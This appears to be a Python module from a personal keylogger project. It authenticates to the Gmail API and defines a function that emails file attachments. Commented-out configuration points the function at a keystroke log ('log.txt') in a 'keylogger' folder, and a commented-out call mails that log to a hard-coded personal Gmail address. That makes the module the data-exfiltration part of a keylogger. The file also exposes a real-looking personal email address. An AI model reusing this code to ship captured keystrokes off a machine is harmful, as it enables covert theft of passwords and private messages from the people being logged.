import base64
import mimetypes
import os
import pickle
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders


SCOPES = ['https://mail.google.com/']
"""
from_address = '2112.vas.1803@gmail.com'
to_address = '2112.vas.1803@gmail.com'

key_info = "log.txt"
file_path = "C:\\Users\\Varun\\PycharmProjects\\keylogger"
extend = "\\"
"""


def authenticateGmailAPIs():
    creds = None
    if os.path.exists("token.pickle"):
        with open("token.pickle", "rb") as token:
            creds = pickle.load(token)

    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)

        with open("token.pickle", "wb") as token:
            pickle.dump(creds, token)
    return build('gmail', 'v1', credentials=creds)


# ServicesGA = authenticateGmailAPIs()


def send_mail(to_add,from_add,subject,main_body,attachments,service):
    msg = MIMEMultipart()
    msg['to'] = to_add
    msg['from'] = from_add
    msg['subject'] = subject
    body = main_body
    msg.attach(MIMEText(body,'plain'))

    for att in attachments:
        content_type, encoding = mimetypes.guess_type(att)
        main_type, sub_type = content_type.split('/', 1)
        fp = open(att, 'rb')
        p = MIMEBase(main_type, sub_type)
        p.set_payload(fp.read())
        p.add_header('Content-Disposition', 'attachment', filename=att)
        encoders.encode_base64(p)
        fp.close()
        msg.attach(p)

    raw_string = base64.urlsafe_b64encode(msg.as_bytes()).decode()
    service.users().messages().send(
        userId='me',
        body={'raw': raw_string}).execute()


# send_mail(to_address,from_address,"Log","Take a look at this log!!",file_path + extend + key_info,\
# authenticateGmailAPIs())
